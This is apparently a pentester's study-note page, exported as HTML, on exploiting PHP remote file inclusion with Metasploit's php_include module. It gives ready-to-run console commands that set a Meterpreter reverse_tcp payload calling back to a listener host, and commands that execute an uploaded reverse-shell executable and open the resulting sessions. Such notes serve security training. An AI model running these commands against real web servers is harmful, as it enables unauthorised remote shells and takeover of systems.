<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>metasploit (/unix/webapp/php_include)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>metasploit (/unix/webapp/php_include)</h1><br/><br /><br /><strong>exploit/unix/webapp/php_include</strong><br />We can exploit the remote File Inclusion vulnerability with the Metasploit module “exploit/unix/webapp/php_include”<br /><br />• set up a Reverse Shell (php/meterpreter/reverse_tcp)<br /><div class="codebox"><pre>msf&gt; use exploit<span style="color:#ff9d00;font-weight:700">/</span>unix<span style="color:#ff9d00;font-weight:700">/</span>webapp<span style="color:#ff9d00;font-weight:700">/</span>php_include<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> PAYLOAD php<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> RHOST [WebAppIp]<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> PHPURI <span style="color:#ff9d00;font-weight:700">/</span>index.php?pag=XXpathXX<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> SRVHOST 172.16.5.20<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> LHOST 172.16.5.20<br />msf&gt; exploit</pre></div><br /><br />    <a href=""><img src="images/2099-1.png" alt="images/2099-1.png" /></a><br /><br />• Execute a command on the Web Server (payload php/exec)<br />    In this example we have chosen to execute a shell.exe <br />    This because we are been able to upload a reverse shell executable (shell.exe) on the Target. we want to execute<br />    REMEMBER: we need an handler listening in the background (run -j) with the same payload of shell.exe<br />    <div class="codebox"><pre>msf&gt; use exploit<span style="color:#ff9d00;font-weight:700">/</span>unix<span style="color:#ff9d00;font-weight:700">/</span>webapp<span style="color:#ff9d00;font-weight:700">/</span>php_include<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> payload php<span style="color:#ff9d00;font-weight:700">/</span>exec<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> RHOST [WebAppIp]<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> PHPURI <span style="color:#ff9d00;font-weight:700">/</span>index.php?pag=XXpathXX<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> SRVHOST 172.16.5.20<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> LHOST 172.16.5.20<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> cmd shell.exe<br />msf&gt; exploit</pre></div><br />    <a href=""><img src="images/2099-2.png" alt="images/2099-2.png" /></a><br />    once the exploit is been executed.<br />    <div class="codebox"><pre>msf&gt; sessions<br />msf&gt; sessions [<span style="color:#ff9d00;font-weight:700">id</span>]</pre></div><br />    <a href=""><img src="images/2099-3.png" alt="images/2099-3.png" /></a><br /><br /><br />Bibliography:<br /><a href="https://www.offensive-security.com/metasploit-unleashed/php-meterpreter/">https://www.offensive-security.com/metasploit-unleashed/php-meterpreter/</a></div>
</body>
</html>
